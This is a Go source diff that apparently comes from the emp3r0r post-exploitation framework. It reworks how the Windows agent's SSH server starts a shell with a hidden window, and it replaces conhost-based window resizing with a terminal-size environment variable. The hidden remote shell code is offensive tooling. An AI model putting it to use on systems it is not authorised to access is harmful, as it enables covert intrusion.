@@ -16,7 +16,6 @@ import (
 
 	"github.com/gliderlabs/ssh"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/shirou/gopsutil/v3/process"
 	"golang.org/x/sys/windows"
 )
 
@@ -86,7 +85,8 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			HideWindow:    true,
 			CreationFlags: windows.CREATE_NEW_CONSOLE,
 		}
-		ctx, cancel := context.WithCancel(context.Background())
+
+		_, cancel := context.WithCancel(context.Background())
 		defer cancel()
 
 		// console configs
@@ -102,55 +102,13 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			cmd, len(cmd.Args), cmd.Args, cmd.Env)
 
 		if IsConPTYSupported() {
-
-			go func() {
-				defer func() {
-					cancel()
-					if cmd.Process != nil {
-						// cleanup obsolete shell process
-						cmd.Process.Kill()
-					}
-				}()
-				for ctx.Err() == nil {
-					if cmd.Process != nil {
-						win := <-winCh
-						if win.Width <= 0 || win.Height <= 0 {
-							log.Printf("w/h is 0, aborting")
-							return
-						}
-						conhost_pid := int32(cmd.Process.Pid)
-						conhost_proc, err := process.NewProcess(conhost_pid)
-						if err != nil {
-							log.Printf("conhost process %d not found", conhost_pid)
-							continue
-						}
-
-						var shell_proc *process.Process
-						// wait until conhost.exe starts the shell
-						for i := 0; i < 5; i++ {
-							util.TakeABlink()
-							children, err := conhost_proc.Children()
-							if err != nil {
-								log.Printf("conhost get children: %v", err)
-								return
-							}
-							if len(children) > 0 {
-								shell_proc = children[0] // there should be only 1 child
-								break
-							}
-						}
-						if shell_proc == nil {
-							log.Printf("conhost.exe (%d) has no shell spawned", conhost_pid)
-							return
-						}
-						// FIXME resizing won't work properly, disabled
-						// SetCosoleWinsize(int(shell_proc.Pid), win.Width, win.Height)
-					}
-					util.TakeABlink()
-				}
-			}()
+			win := <-winCh
+			if win.Width <= 0 || win.Height <= 0 {
+				log.Printf("w/h is 0, aborting")
+			} else {
+				cmd.Env = append(cmd.Env, fmt.Sprintf("TERM_SIZE=%dx%d", win.Width, win.Height))
+			}
 		}
-
 		err = cmd.Start()
 		if err != nil {
 			log.Printf("Start shell %s: %v", shell, err)
